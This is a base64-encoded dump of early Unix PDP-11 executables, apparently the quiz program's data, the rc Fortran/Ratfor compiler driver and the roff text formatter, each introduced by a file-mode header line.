ASYQwB3GCiQBJhDAHcAKIAEmEMAdugocASYQwB20ChgBJhDAHa4KFAEmEMAdqAoQASYQwB
2iCgwBJhDAHZwKCAEmEMAdlgoEASYQwB2QCgABZhCmEOYQJhHICYQVgxWCFYEVgBUGAGYR
hRENiaYQQh0EABIQUhCCFYUVhwBmEYURBACFFYcAZhGFEUAdBAABiUARhREmEeYQphDmC0
gAQRFEGEMYQhhGEYUVhwA3EPIHwBX//0YRhRWHAAAACgAAAAAAAABdAHwAfQAAAE4BTgFg
AU4BcAEAAF0AfAB9AAAAogGiAawBpgGIAQAAWwBcAF0AewB8AH0AAADMAQQC0gHMATwCzA
HMAeoBAABbAFwAXQB7AHwAfQAAAC4DAgMQAy4DAgP4Ai4DHANpAHQAAAByBZIFqgVUb28g
aGFyZCBmb3IgbWUKAFRvbyBtYW55IGZhY3RzIGFib3V0IG9uZSB0aGluZwoASSd2ZSBmb3
Jnb3R0ZW4gc29tZSBvZiBpdAoAL3Vzci9saWIvcXVpei9pbmRleABObyBpbmZvCgAKAAoA
UmlnaHQhCgBXaGF0PwoAClJpZ2h0cyAlZCwgd3JvbmdzICVkLCAAZXh0cmEgZ3Vlc3Nlcy
AlZCwgAHNjb3JlICVkJSUKAFN1YmplY3RzOgoKAC0AIAAKAAoARm9yIGV4YW1wbGUsCgAg
ICAgcXVpeiAAIAAKYXNrcyB5b3UgYSAAIGFuZCB5b3UgYW5zd2VyIHRoZSAACiAgICBxdW
l6IAAgAAp3b3JrcyB0aGUgb3RoZXIgd2F5IGFyb3VuZAoAClR5cGUgZW1wdHkgbGluZSB0
byBnZXQgY29ycmVjdCBhbnN3ZXIuCgBCYWQgaW5mbyAlcwoASSBkb24ndCBrbm93IGFib3
V0IHRoYXQKANIR0BHSEdIRfgtkANQLbwDOC3gAEAxmAB4MZQCsC2MAugtzAIoLbAAsDHIA
AAAAAPz/8P/9//j/BInWFwAABYkAAAAAA4kAAAACA4kAAAAAEYkAAP4ZE4kAAAAAMIkAAA
AA
-- /usr/bin/rc mode=0110775 uid=3 gid=3 atime=174923535 mtime=174923535 base64=1 --
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
BtYLwAsRA8Ad0AnADLcKyglwHQQAxhlOHQQA3wmEBMAlbwACArcKtAl3AI4Jdwl8CfcLrA
kHA04dBADmFQsS3wn+CtYL9QsEAAMCAAp3AGoJTh0EAN8J5g/5AXcJTgnG5egCDgrmFRYS
3wn2DdYLNxC0C0AEzhUeEt8Jzgo7AU4RzmUe/2YRzmUy/98JdAjWC04RzmUe/98JVghOEc
5lGP1mEc5lHv/fCRQO1gs1EBT9CAROEc5lHv/mFTIS3wnOCtYLThHOZRj9ZhHOZTL/3wky
CNYLThHOZTL/3wl+CsALFgNOEc5lGP3fCZQOTh0U/d8JYg1OEc5lMv/fCQQIwAu+As4dIA
vfCWINdwCsCE4RzmUy/98JBAjUAXcJjgjmC/cJEgU1EPj/PZAEALUKBADAJQoAAwP1C/j/
8gI9igQAQB34/3cAcgh3CWAICgFOHQYAQJ8EACYQtQoEAN8JcA7WC/2LBADzAncATgh3CT
wITh0EAN8JSgbBHVwIwQy3ClYIMRBiGXcAMAh3CR4IxuUGAAIBtQoEAP2lIAAEAPoD/aUJ
AAQA9gPOFUASZh0EAN8JFArWC8ALFAP1ZQoABAADAfVlCAAEAP2lIAAEAAYD/aUJAAQAAg
NfALIJtQoEAPMBzhVLEmYdBADfCRQK1gvAC+cCzhVUEmYdBADfCRQK1gvACwMD9WMEAMYB
zhVZEmYdBADfCRQK1gvACwQD9WUHAAQAuQHOFWESZh0EAN8JFArWC8AL8wLOFWkSZh0EAN
8JFArWC8ALBAP1ZQYABACjAc4VcBJmHQQA3wkUCtYLwAsEA/VlCQAEAJYBzhV6EmYdBADf
CRQK1gvAC9ACzhWCEmYdBADfCRQK1gvACw4D9RWIEgQAQB0EAMEdQAfBZTAAcJAJALcKNA
eOATUK+P9AHQYAQG34/0Ed+P9InJMSMgO1Cvj/9AE1Cvj/CwFAHQYAQG34/0EdBABBbfj/
SJK1Cvj/QB0EAEBt+P8Akg4Q3wk+CsAL6wJAHfj/QG0GAMiVLgC1Cvj/QB34/0BtBgDIlW
YAtQr4/0Ad+P9AbQYACIq1Cvj/dwCQBncJfgb9iwYADQNAHQQAtQoEAEEdBgC1CgYASKLz
AwAKdwBsBsAVAQD7AXcJVAb1JWEABAAEBvUlegAEABME9SVBAAQABAb1JVoABAALBPUlMA
AEAAQG9SU5AAQAAwQACncALAbAFQEA+wF3CRQG/YsEAAQCwBUBAHcAFAb9pSAABAAEA/2l
CQAEAAMCtQoEAPUB/aVlAAQADgJAHQQA8KVuAAEACALwpWQAAgAEAvClCgADAN8DAArfAX
cJxAX3FQEAaA9OHQYAZh0EAN8J/grWC84VCgDfCbAMzhUBAN8J3gy3CjQPdwCmBXcJlAXG
5X4Adx0EACwPRBHEZQYAwJ8iDwkDtwocDxcgJQAGAw4Q3wmwDPQBdwB2BTcKCA83CggP16
/+Di0ABAK3CvYOtwr0DvcIKAF3EOgONwrqDhcgLgAEAvcIFgF3EN4OgxHDZQQAwRWaEkIU
2gMRIPwCSgABFQUEAQvTlS0AAQEBFfcJAgBSAQAKF3IKAGYQARACA/cJ8P+AFcBlMAATkI
cAE5UBAsMKE5VAAsMKPgHBHYoOAwoCE9KLAgODCkR+AhU4AcIVwhICAcIVxhIBFQUD9wto
DgID05UwAAAK9wkCACQBZhAKdgID9wn2/4AVgEwCAMBlMAAXIDkAAgfAZQcAE5CHAMAdNA
7CHS4O9wmUAAwBwB0mDsIdIA73CYYABQEEFTcVEA53AOb+ghHCZQQAg+AmEeYVIADEEAML
w230DQYH9wvyDQMC3wmwDMN+xAsEA46U3wmwDAR/wwsFB84VIADfCbAMw37WC4QVdwCg/j
cKxg0BCsCfvA23CrgNwOUwABcg+v8CAgAVAwEXIAkABoK3CqQNV3AKAAFg7AHAZTAAgwDE
ZQgA05U/AIcAZhGFEcAdjA0EAvcJLADAHYINUJ0EAAcDtwp4DfcKcg0CBvcJFABAHQQAhR
WHAGYRhRH3CQQAhRWHAMAdVg0KA8DlRho3ENYFwB1EDQECgAoAicoS9xVGGjoN9xUAAjIN
1y0sDQIAA4L3FQEAJA2HAGYRhRH3CuoFDgT3FRYT5AXAHdwFA4kWEwACDIfACwoDwAo3EM
wFAArA38gFtwrEBYUVhwA3ENgMAAo3CrQFhRWHAGYRhRFAHQQABokChncAQAMACoUVhwBm
EYURdx0EAFAFdx0GAEwFAInQEgKGdwAgA4UVhwBmEYURdx0EADgFdx0GADQF9wuIDAUD5h
UQ8OYVtg0GAACJ1hJ3APQCZhGFEQKJAwEFhncA5gI3EHYOAAqFFYcAZhGFEXcdBAD+BHcd
BgD6BACJ3BIChncAwgIACoUVhwBmEYURdx0EAOQEdx0GAOAEAIniEgKGdwCiAoUVhwBmEY
URdx0EAMwEQR0GAMkRAInoElGHERARChEKTwFmEYURQR0GAPEKAgAEBPcJXgDxCgIAeZ0E
AAQAsQoEAPEKAgAEBPcJRgDxCgIAeZ0FAAQAsQoEAEAdBAAwAWYRhRFBHQYA8QoCAAQE9w
kgAPEKAgBAHQQAOZAEALEKBAAeAWYRhRFBHQQA9wkCABcBQBDAZQYAJhA3EEIEdxwEAD4E
BQM34DgEQBIAie4SsRUEAPEVAAICAIcAdwDiATcKXAuFFYcAZhGFEUEdBABXIBQAH4ZAHQ
YAdxAIBMEMZhxIHDEQSBw3EPwDCQPANQEABgLBDMEMwWUwD3cQ6AMAifQSCofANQEAAQMO
EIAVhRWHAMAVFgAmCtYLdwCCASYQwB0SDUwBJhDAHQwNSAEmEMAdBg1EASYQwB0ADUABJh
DAHfoMPAEmEMAd9Aw4ASYQwB3uDDQBJhDAHegMMAEmEMAd4gwsASYQwB3cDCgBJhDAHdYM
JAEmEMAd0AwgASYQwB3KDBwBJhDAHcQMGAEmEMAdvgwUASYQwB24DBABJhDAHbIMDAEmEM
AdrAwIASYQwB2mDAQBJhDAHaAMAAFmEKYQ5hAmEcgJhBWDFYIVgRWAFQYAZhGFEXcdBAAM
AwCJ+hIChncAuAAACoUVhwBmEYUR9wkiACYQB4kDhtYLdwCeANYLAgN9EAQAhRWHAGYRhR
FAHQQAAYlmEUEdAgCFEQAKdyz8/8QCAgLAFQIAdyK+AgMCwGUCACIBdyK0AgMCwGUEABwB
dyKqAgMCQGwCABYBdyKiAgUCQWwCAMFlBADmAXesAQCVAgoCJhBAEsAAF3T5/wFgwWUCAI
AV2AGADIUVhwBAEYURJhHmEKYQ5gtIAEERRBhDGEIYRhGFFYcANxB6CcAV//9GEYUVhwAW
FQAAAAAAAAAAAAABAO4Q/BAyAGMAZABmAHIAdgAAAIgAgABYAHgAZgBgAJAAL3Vzci9mb3
J0L2ZjMQAvdXNyL2xpYi9yYXRmb3IAL3Vzci9mb3J0L2ZjMgBjZmxhZz0lZCwgbmw9JWQK
AGxkAC14AC9saWIvZnIwLm8ALWxmAC9saWIvZmlsaWIuYQAtbAAvYmluL2xkAHJhdGp1bm
sAZi50bXAxACVzOgoAcmF0anVuawBjYW4ndCByYXRmb3IKACAgIABsZAAtcgAteAAvYmlu
L2xkAGEub3V0ACVzOgoAYXMALQBmLnRtcDEAL2Jpbi9hcwBhLm91dABtb3ZlIGZhaWxlZD
ogJXMKACVzIABDYW4ndCBmaW5kICVzCgBUcnkgYWdhaW4KAEZhdGFsIGVycm9yIGluICVz
CgBzdGF0dXMgPSAlZAoAdW5saW5rICVzCgByYXRqdW5rAGNhbid0IG9wZW4gcmF0anVuaw
oAY2FuJ3Qgb3BlbiAlcwBzdWJyb3V0aW5lAGZ1bmN0aW9uAHJlYWwAaW50ZWdlcgBsb2dp
Y2FsAGRvdWJsZQBwcmVjaXNpb24AY29tcGxleABibG9jawBibG9ja2RhdGEgAE1BSU4uZg
B0C2QAygtvAMQLeAAGDGYAFAxlAKILYwCwC3MAgAtsACIMcgAAAAAA/P/w//3/+P8EiUYa
AAAIiQAAAAALiQAAAAAJiQAAAAAFiQAAAAAIiQAAtgEEiQAAAAAwiQAAAAAKiQAA3wkAAN
YLliXGZQAAdwDy7P8B
-- /usr/bin/roff mode=0110775 uid=3 gid=3 atime=174924230 mtime=174924230 base64=1 --
BwGyHwYATgYAAAAAAAABAJch3CUEgncJ8AAYAQGJAAr3CQ4EMIkBAGgGMIkCAGgG9wmgAA
WJFB8AAAuHNxAYIBOJEAAAAAWHwB0MIAOJXiI0AAAKtxXIH/cKxB8CAncAFgbWC4QTF6Ur
AAQCdwn2AzYgEwEXrf//LQASAhejcwADArcKRB8JARejaAADAjcKWh4DAXcJzgPeHvcKgh
/hBvcVoACGBfcVAAB4H/cVAAB0H7cRbB/3Ca4TAAowkKAigAoXIIAA+gL3CV4M9wmADncA
PAMSiTUf6CMEhgiJNR8AAQiGt4plHtetYR56APKDdwCEBTcQ7B4EiV4ggAAFiTUfAAA3EN
4ehwBBFUIQdxAQANGL/gKB4HcQCADAFQEABIkAAAAAhQBUb28gbWFueSBmaWxlcy4KAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA3CvQb9wnwADeg
8BoFAzeQ6hv3CbIN9AH3CXwD9wlOAO8BwAsUAvcJLBs3kAUbEokrH+gj9x20HxAA9x0MAB
IA90USAAQAD4krHwAAhwAPiSsfAACHADcRuhv3Ff8/tht3CQoKAAAdEDcKkBuFADcKihv3
C4IbAwL3CXwA+AGHAPcLuhs5B/cLoBsTA/cLnhsGBvcLlhsIBjcKjhsKAfcKjBvAFQgAhw
D3CoAbwBVfAIcA9wlCABcgMAAPBRcgOQAWBxcgQQAJBRcgWgAQBxcgYQADBRcgegAKB/cL
ThsBBocA9xUBAEIbNxAQG8kBtwo8G7cKNhuHAMAdABsDAzcK+hqHAPcL8BoDA8AVCgCHAP
cJigAXIFwABgL3CYAAdwlWAFIFCAEXIBsABQL3CW4AdwlEAGgFFyAKAAQCtwq4GjcKohpm
EPcJaA93YJgagRWHAGQadR1yHngOeQ9sf3QJYUBuI1xcAAA3HjgdORo0GDMZMRYyFwAAZh
BBFUCkDAPRi/wCVyBoBQUHVyB4BQIGwBUfAIEVhQBAlIEVhQD3C0gaBQf3CkIawB1cGYcA
ZhD3CyYaAwP3CY4LMAH3CxIaBQLBHU4adyBMGhICwB3CHAIC9wlQADcK+BkDiQAAAAI9h8
AL9gPBFQAAQGA3ECYaQJR3EB4aFyAJABACgRXAFQoftwrkGciLygPQrdgZ+wQ3mNYZ9+3O
GdAZwQECAcALxwOBFYcAwB1oHAEDBon3C6AZBAP3Fb4fFgAJAfcK0BkNBfcfzBkIAPdlAg
DEGQWJAAAAAAOHNxA4HIcA9wm6BvcJdAj3CRIBMIkCAAEAwBUBAPcJrP0KiTUfAYmHAPct
ZBiyGQwFNwqsGcBFgP8HAwCcoCIXICAAAwK3CpIZhwAXIAoABQI3CoYZNwo6GSkB9wt8GS
YD9wsiGBoC9wmSAMEtbBkVBfcVCQAaAFcgAQAGBvcVIAAOAPcKVBkCAXfgThkmEMAVCQD3
CUAAgBXgASYQwBUgAPcJMgCAFfcKMBn3AhcgFgASBRcgHwAhAw4GJhB3CWL+ageAJQgDJh
DAFRsA9wkGAPcKvhiAFRcgCQADAvcJHAACAfcJdg13YKgYP5DAF7cKvBfXLbgXgAIVA4cA
AQrBZQgAwS2MGPsGwe2GGAICwRUIAIcAGjkdOB43GTMYNBYxFzIAAMAdhhfA5QACNxAIAM
AVAQAEiQACAAD3FQACbheHAPcJXP0mEPcJVv3AAIBTwRXkB04UzkUAgA4gEwJOEuELD4D3
CbD81y2CF+QfDQb/HRAYeBf3ZQIAche3EwQYBAFeAFck///lAtYLhwBhZBwJYnAkCmJyKA
ljYy4JY2VGCWRzXglmaWoJaW50CWl4jAlsaZwJbGy6CWxzygluYQAKbmUKCm5mGgpwYSQK
YmxGCnBscApza4AKc3CQCnNzogp0YdQKdGnuCnRyrgp1bAILdW4SC2hlPgtoeCgLZm9MC2
VoWgtvaGILZWZqC29mcgttMXoLbTKKC20zmgttNKoLaGO+C2h57gtuMfoLbjIGDG5uKgxu
aToMam9KDGFyVgxyb1wMbnhiDHBvhAxkZZgMaWfkDHRj1gtta+4MAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/////3CfoDtwrUFYcAhwD3Ce
4DhwD3CcoD9wnC+xcgCgACAzeQvBU3ELgWhwD3CdADdwkcBQAA9wkeBzcQ6Bb3Cf4GhwD3
CbgD9xUCAHoVhwD3CawDtwqIFYcA9wmiA3cJ7gRCIPcJ8AY3ELwWNxC6FocAdwnaBEIg9w
ncBjcQqBaHAHcJygQAACYQzgoHBfcJwvo3CkgW9wkUCPcB1guHAHcJrATwHvcJrgY3ECgV
hwD3CUwD9wkqA/cJIvsXIAoABAL3HQQVABWHADcQFBZ3CYIE4h7ACvcJfgaACjcQ6BQ3EO
YUhwD3CRYDNwrwFIcAdwlcBAAA9wleBvcJQgaHAPcJ/AI3CtgUhwD3CfIC9wmsBPcJzAL3
C8QVBwJ3CTAE5h73CTIGNxCiFIcA9wnQAncJHAQAAPcJHgYmEPcJCAbOCgcFwBUgAPcJ9g
T3CbAC9wHWC4cAdwn2A/YeNxB8FPcJ2gmHAHcJ5gMAAPcJ6AU3EJgVhwD3CYYCdwnSAwAA
dwlkC1gOhwD3CXQC9xUBADYUhwD3CUoC9wlC+hcgCgALAwEQ9wk2+hcgCgACAsAVIAAxkK
Ai8AGHAMEVCh93CY4DAAD3CZAFwAoCBxGQ9wERiocA9wkoAncJdANCIPcJdgU3EEQVhwB3
CWQDAAD3CWYFNxAuFYcAdwlUAwAAwO0mFQAL9wlQBTcQHhWHAPcLyBMDAzcKwhMCAbcKvB
P3CRwJhwB3CZwJmCL3HVAXUBeHAHcJjgmcIvcdRhdGF4cAdwmACZgihwB3CXgJmiKHAHcJ
cAmcIocAdwloCZ4ihwB3CewC6B73Ce4ENxBgExcBdwncAuoe9wneBDcQUhMPAXcJzALsHv
cJzgQ3EEQTBwF3CbwC7h73Cb4ENxA2E/cJnAiHAPcJOgH3CTL5FyAKAAICwJWAADcQKhOH
APcJIgH3CRr5FyAKAAICwBUgADcQHBOHAHcJeAIAADcQCBOHAPcJHAH3FQEAIBQFAfcJEA
H3FQIAFBQ3Ch4UdwlSAgAAwAsDBzcQABSHADcK/BOHAHcJPAIAAPcJPgQ3EPoThwB3CSwC
OCD3CS4ENxDwE4cAdwkcAgAANxCgE4cANwraE4cAtwrUE4cA9wmWAHcJEAS+H7cKYhP3Cb
L5twqAEzcKXhP3FdwfwhKHAPcJkgB3Cd4B4B73CeADNxBKEocA9ws+EyIC9wlaAHcJ1AO+
HzcKLBPBFeQHJgpOFAUDzkUAgM4tABMIAvdVAID4EskdeBLhHfASBQFXJP//7gK3Cv4S0Q
v3CcgD1guHALcK8BL3CbwDhwD3CSgAwBUCAPcJhPmHAPcJ+PcCEPcJYgT6A8AlIAADAvcJ
5vf6ATcQ5BKHAPcLABNUBz+K2hK3CuASwB22EcAKdwnQCFgO9wu+EUcD9y3cEtwSAgL3CZ
IB9wvQEhgCwB2YEXcJrghKDvc1AQCKEQQCdwm6B5giAwF3CbIHmiLAHXoRdwmOCEoO9wqs
EuMEwB1gEfcJdgj3CXIAwB24EvcJagj3CToAwhXoI4CUwCUgAAYC9wksBfcLdhL3AgUB9w
nO+PcKahLxBvcJkAA3CmoSNwpeEvcdfBJ8EvcJXgKHAPcLIhISA8AdFBLAbRISDQM3CgoS
NwoIEsAdCBLXLQYSAQABAoAM9wkCCIcA9wsmEiQD9wouEgcFwBUFAMBtKhL3CegHhwAACt
ctCBJkAAYEgArXLf4RCgABBIAKwG0KEvcJyAfAHewRdwncB34GwBUCAPcJtge3CtoRhwDA
FQoA9wks+LcKxBGHAMAdvhEFAzcguhECA/cJ4v+HAPcJjv5mEOYQAwomCiYK9wl89hcgKw
ANAxcgLQAKA8DlMAAXIAkACIKOCtdwCgADYO4BNhACAOsBwGUwADcQUhGAFQMCwxUBAMAQ
QBUBAwASgRVXIC0AAgLA4AYBVyArAAICwGABAcAQgxWBFYUA9wsaECkD9ws4ESYDwB0OEM
DtLhHA7f4PwO0AEHcJCgdKDvc1AQDmDwQCdwkWBpwiAwF3CQ4GniLXLRARAQADAvcVAQAE
EcAdzA93CdwGSg43Cu4Qtwq2D/ctsg+oDwQH9wk++HcAKPf3C3YQCgP3LZwP6hAGh/cJKP
gACgOJvB8BAIcA1y2eENwlDIY/kJYQtwqSEPcJQgV3YKwQd+B6ELcKohCHAMIVICM3CpIQ
Nwq8EDcKgBA3CnAP9xUgI14QJgr3CeL0FyAKADkDNyBWDwMCtwpUD/UBwCUgAAMC9wmQAO
8BJhDAFSAA9wmEAPcLMBAEA/cJegA3CiYQgBX3CXAAstP//w4K9wmc9DcgFg8GArcKFA/3
CY70zhWAAMAlIAAJA8AlCgDqApes//8uAAICtwrsD/ZlAgACABKK1gv3FSAj2A/3C/wPAg
L3CQIAhwD3Fegjzg/3HbwOvA/37QoQtg83CuAPNwqoDzcKpg+HAPcJZAR3YMYPtwrwDxKQ
hwADEPdwgg7AEMBttA83ILIPAgf3CWj+hwDACwEEAAqHAGYQphBBFcIVEgD3CXD0FyAhAA
MFFyB+AAYHNxBkDxGKghWBFYUAEZDCCvkD7gFBEvcJwPM3CkYP5hUBAPcJPvQXIAoABQLO
FQEANwowDw4BFyAuAAoClyMBAAMGBgWOCgUBwQoACo4KAQEOCvcL7g4CAvcJKgCXIwMA4A
LWC/cL3A4CAncQQA6HANctPA7cHwYD9+UCADIO9x8uDsIOhwA3EHYRdxAGAMAdrg4TiQAA
AADAHaQOBImUIgEAgQr3LZoOAg4DAvcV///6DYcAwR2ODvcdhg5EEfcJMgDAiwMC9wmm/4
cAtwp2DocAApKXIEEAC4eXIFoABoOXIGEABYeXIHoAAoK0AIcApACHAGYQwUU/AHcgGgAE
Avct/hCmDQ8DdxAMAPcd8hCaDcAd7BATif//AADAHeIQA4leIAACgBPARcD/AJxeIIEVhw
A3Cl4ONwp2DjcKRA73C2gOMAL3CxwNLQP3CRTzNxAUDsAlIAAKAvcJKPv3CQLzwCUgAPQC
twpEDvgBFyAKAAcC9wkO+zcK7A33CUT8DAH3CywOAwL3CV79BgH3CeQA9wL3CXQA9AH3Cg
wOAgQ3CgYOhwD3Cdz69wk+8hcgCgAHA/cJZgJ3YNAN9wkI/fQB9wvmDQ8H9wrgDcAdjg2A
DAGAAAo3YNYN9wuyDQMD92UCAMoNNwpuDTcKbA33FQACoA3AFSAA9wnM/PcJhvr3CqYNAo
A3CqANhwCmEOYQAgoDCvcLTAwIA8Addg3ACgQHwx04DQEHgHL3ECoNtxAoDYMVghX3CUz6
hwDAHRoNgAr3CkQNl6QgAPoDwgr3NQEAIA0IA7cK/gz3LfoMNA0GBYAKBAH3Cu4MAYGACv
cJ9AKAkocA9x04DfIMxB3iDDdh6gz3CwwNDAIAlRcgIAAHAvcKHA33CYQBd+DmDPUBxAr3
Ld4MtgwVB9ctsAwEABEHwB2YC8BtzAw3IMoMCAbAHYoLwAzAbbwMNyC6DAIG9wl6AzcKog
zmHdYMAJUXIC0ABgICk/cJ6v0CAszVgADACxmAwEWA/wMRw+UEANcgICMRh8KSwkWA//cJ
xv0EA9ctSgwCAAcHJhAACvcJqPuAFbcKVAz3CfQAd+BWDPcJlvv3CnwM0gL3CyIMBQW3Cl
IM1gukAIcAwx0eDPcLKgwGAvcLPgwpA84tVgwoA8CYFAL3ChQMAwL3CygMAwP3C+wLCwfX
rP//LQAXA8uVLQD3CtoLtwoEDBAB9wr8C8uL3QP3CYgAd+DyC3dgwAu3ChAMxAp3YNwL0Q
G3CuYLNxGwC8zFgP8XISAjAQQEANYLtACHAMAdmgoDAjcKuguHAMDthArA7YIKwO2ECjcQ
qAvAHXAKwG1uCsBtdAo3IJgLDgXAFQIANxBaCjcQWAo3EFYKNxBUCvcVQgBWCtsB9y10C3
QLAwf3HW4LaguHADcgSAoRA8ALDwMXIH8ADAMXIAgAAwLBFf//hwDAJSAAAwbBFQEAhwAB
CocA9wka+MEdXApdEPcJlO8XIAoADAMCEPcJiO8XIAoABgMCIAECAAr3CRL89QEACvcJCv
x3EC4K9x3YCdgJhQD3C9QJAgLVC4UAJgpCHwAA9x2mCmQNdwl2ALIUJhB3CW4AshQmEHcJ
ZgCyFCYQwB2SCfcJqAD3C84KBgPAFQUAwG3YCjYQBgBCF3cJQgB+BsAdggmAbQYAgO0CAI
AMgO0EAAEEAAomEPcJcgB3CSAAfgbAHWAJgOWA5YDlgOWAZfcJWgB3CQgAfgb3CaD4hQAm
CmYQgRCCCvcJ0PuBFcCLGwMXICUABAP9CQAATmDxAcAdFgkBCvcLXgoKA/cVJB9cCvcVKB
9YCvcJagBOYOEB9wkuAE5g3QGAFdULhQB3CQQAfgaHACYQzgoFBcAVIAD9CQAA+QFWJYUA
9wkEANULhQCmEOYQ9wkGAIMVghWHAGYQAgoDEJdyCgDmEIAQBAP3Cd7/dhACAIAVwGUwAP
